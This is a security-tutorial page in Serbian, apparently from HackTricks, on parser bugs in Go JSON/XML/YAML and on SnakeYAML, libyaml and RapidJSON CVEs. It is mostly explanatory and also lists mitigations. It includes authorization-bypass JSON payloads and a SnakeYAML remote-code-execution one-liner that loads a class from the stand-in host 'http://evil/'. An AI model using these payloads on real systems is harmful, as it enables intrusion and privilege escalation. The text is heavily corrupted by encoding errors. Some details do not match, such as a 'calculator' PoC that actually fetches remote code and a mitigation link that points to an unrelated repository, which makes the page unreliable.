# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

SledeÄ‡i problemi su otkriveni u Go JSON-u, iako se mogu pojaviti i u drugim jezicima. Ovi problemi su objavljeni u [**ovom blog postu**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

Go-ovi JSON, XML i YAML parseri imaju dugu istoriju nedoslednosti i nesigurnih podrazumevanih postavki koje se mogu iskoristiti za **obiÄ‡i autentifikaciju**, **poveÄ‡ati privilegije** ili **ekstraktovati osetljive podatke**.


### (Un)Marshaling Unexpected Data

Cilj je iskoristiti strukture koje omoguÄ‡avaju napadaÄu da Äita/piÅ¡e osetljiva polja (npr., `IsAdmin`, `Password`).

- Primer strukture:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- UobiÄajene ranjivosti

1. **NedostajuÄ‡i tag** (bez taga = polje se i dalje obraÄ‘uje po defaultu):
```go
type User struct {
Username string
}
```
Teret:
```json
{"Username": "admin"}
```
2. **PogreÅ¡na upotreba `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // âŒ wrong
}
```
Payload:
```json
{"-": true}
```
âœ”ï¸ Pravi naÄin da se blokira polje od (de)serijalizacije:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Parser Differentials

Cilj je zaobiÄ‡i autorizaciju iskoriÅ¡Ä‡avanjem naÄina na koji razliÄiti parseri razliÄito interpretiraju isti payload, kao u:
- CVE-2017-12635: Apache CouchDB zaobilaÅ¾enje putem duplih kljuÄeva
- 2022: Zoom 0-click RCE putem nekonzistentnosti XML parsera
- GitLab 2025 SAML zaobilaÅ¾enje putem XML Äudnosti

**1. Dupli Polja:**
Go-ov `encoding/json` uzima **poslednje** polje.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
Ostali parseri (npr., Java-ov Jackson) mogu uzeti **prvi**.

**2. Neosetljivost na velika i mala slova:**
Go je neosetljiv na velika i mala slova:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
ÄŒak i Unicode trikovi rade:
```go
json.Unmarshal([]byte(`{"aâ„ªtionÅ¿": "bypass"}`), &req)
```
**3. NeusklaÄ‘enost izmeÄ‘u usluga:**
Zamislite:
- Proxy napisan u Go
- AuthZ usluga napisana u Pythonu

NapadaÄ Å¡alje:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python vidi `UserAction`, dozvoljava ga
- Go vidi `AdminAction`, izvrÅ¡ava ga


### Zbunjenost formata podataka (Poliglot)

Cilj je iskoristiti sisteme koji meÅ¡aju formate (JSON/XML/YAML) ili se otvaraju na greÅ¡kama parsera kao Å¡to su:
- **CVE-2020-16250**: HashiCorp Vault je parsirao JSON sa XML parserom nakon Å¡to je STS vratio JSON umesto XML.

NapadaÄ kontroliÅ¡e:
- `Accept: application/json` zaglavlje
- DelimiÄnu kontrolu nad JSON telom

Go-ov XML parser je to **u svakom sluÄaju** parsirao i verovao injektovanoj identitetu.

- Kreirani payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
Rezultat:
- **Go JSON** parser: `Action_2` (neosetljivo + poslednje pobednik)
- **YAML** parser: `Action_1` (osetljivo na velika i mala slova)
- **XML** parser: parsira `"Action_3"` unutar stringa

---

## ZnaÄajne ranjivosti parsera (2023-2025)

> SledeÄ‡i javno eksploatabilni problemi pokazuju da je nesigurno parsiranje problem viÅ¡e jezika â€” nije samo problem Go-a.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* PogaÄ‘a: `org.yaml:snakeyaml` < **2.0** (koristi se u Spring-Boot, Jenkins, itd.).
* Osnovni uzrok: `new Constructor()` deserializuje **arbitrarne Java klase**, omoguÄ‡avajuÄ‡i lanac gadgeta koji kulminira u izvrÅ¡avanju daljinskog koda.
* Jednolinijski PoC (otvoriÄ‡e kalkulator na ranjivom hostu):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Popravka / UblaÅ¾avanje:
1. **AÅ¾urirajte na â‰¥2.0** (koristi `SafeLoader` po defaultu).
2. Na starijim verzijama, eksplicitno koristite `new Yaml(new SafeConstructor())`.

### libyaml Double-Free (CVE-2024-35325)

* PogaÄ‘a: `libyaml` â‰¤0.2.5 (C biblioteka koja se koristi u mnogim jeziÄkim vezama).
* Problem: Pozivanje `yaml_event_delete()` dva puta dovodi do double-free koji napadaÄi mogu iskoristiti za DoS ili, u nekim scenarijima, eksploataciju heap-a.
* Status: Upstream odbijen kao â€œzloupotreba API-jaâ€, ali Linux distribucije su isporuÄile zakrÄenu **0.2.6** koja null-frees pokazivaÄ odbrambeno.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* PogaÄ‘a: Tencent **RapidJSON** pre commit-a `8269bc2` (<1.1.0-patch-22).
* GreÅ¡ka: U `GenericReader::ParseNumber()` neproverena aritmetika omoguÄ‡ava napadaÄima da kreiraju ogromne numeriÄke literale koji se obavijaju i korumpiraju heap â€” Å¡to na kraju omoguÄ‡ava eskalaciju privilegija kada se rezultantna objekatna grafika koristi za odluke o autorizaciji.

---

### ğŸ” UblaÅ¾avanja (AÅ¾urirano)

| Rizik                                | Popravka / Preporuka                                      |
|-------------------------------------|------------------------------------------------------------|
| Nepoznati polja (JSON)               | `decoder.DisallowUnknownFields()`                          |
| Duplikat polja (JSON)             | âŒ Nema popravke u stdlib â€” validirajte sa [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| Neosetljiva podudarnost (Go)         | âŒ Nema popravke â€” validirajte oznake strukture + pre-kanonizujte ulaz   |
| XML smeÅ¡ni podaci / XXE              | Koristite ojaÄan parser (`encoding/xml` + `DisallowDTD`)     |
| YAML nepoznati kljuÄevi                   | `yaml.KnownFields(true)`                                   |
| **Nepouzdana YAML deserializacija**     | Koristite SafeConstructor / aÅ¾urirajte na SnakeYAML â‰¥2.0            |
| libyaml â‰¤0.2.5 double-free          | AÅ¾urirajte na **0.2.6** ili distribucijski zakrÄenu verziju            |
| RapidJSON <zakrÄeni commit           | Kompajlirajte protiv najnovijeg RapidJSON (â‰¥Juli 2024)              |

## Reference

- Baeldung â€“ â€œReÅ¡avanje CVE-2022-1471 sa SnakeYAML 2.0â€
- Ubuntu Security Tracker â€“ CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
